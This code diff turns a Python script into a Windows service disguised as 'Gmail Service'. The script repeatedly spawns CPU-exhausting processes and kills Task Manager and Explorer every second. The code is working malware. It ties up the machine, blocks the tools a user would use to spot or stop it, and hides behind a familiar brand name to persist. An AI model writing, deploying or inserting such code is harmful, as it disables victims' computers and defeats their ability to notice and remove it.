@@ -1,7 +1,41 @@
+import threading
+import win32serviceutil
+import win32service
+import win32event
 import math
 import psutil
 import time
 from multiprocessing import Process
+
+class GmailService(win32serviceutil.ServiceFramework):
+    _svc_name_ = "GmailService"
+    _svc_display_name_ = "Gmail Service"
+
+    def __init__(self, args):
+        super().__init__(args)
+        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
+
+    def SvcStop(self):
+        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
+        win32event.SetEvent(self.stop_event)
+
+    def SvcDoRun(self):
+        self.main()
+
+    def main(self):
+        while True:
+            p = Process(target=cpu_Killer)
+            p.start()
+
+            status1 = is_running("taskmgr.exe")
+            status2 = is_running("explorer.exe")
+            print("Status1", status1, "\nStatus2", status2)
+
+            if status1 == True or status2 == True:
+                kill_process("taskmgr.exe")
+                kill_process("explorer.exe")
+            time.sleep(1)
+
 
 def cpu_Killer():
     x = 0.1
@@ -21,15 +55,4 @@ def kill_process(process_name):
             proc.kill()
 
 if __name__ == "__main__":
-    while True:
-        p = Process(target=cpu_Killer)
-        p.start()
-
-        status1 = is_running("taskmgr.exe")
-        status2 = is_running("explorer.exe")
-        print("Status1",status1,"\nStatus2", status2)
-
-        if status1 == True or status2 == True:
-            kill_process("taskmgr.exe")
-            kill_process("explorer.exe")
-        time.sleep(1)
+    win32serviceutil.HandleCommandLine(GmailService)
